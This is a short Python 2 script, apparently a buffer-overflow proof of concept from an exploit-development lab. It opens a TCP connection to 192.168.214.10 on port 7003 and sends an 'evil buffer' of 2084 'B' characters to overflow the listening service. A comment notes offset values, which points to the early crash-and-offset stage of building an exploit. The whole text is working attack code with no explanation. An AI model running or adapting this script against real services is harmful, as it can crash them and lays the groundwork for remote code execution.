#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "B" * 2084 # x8b0 2224

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
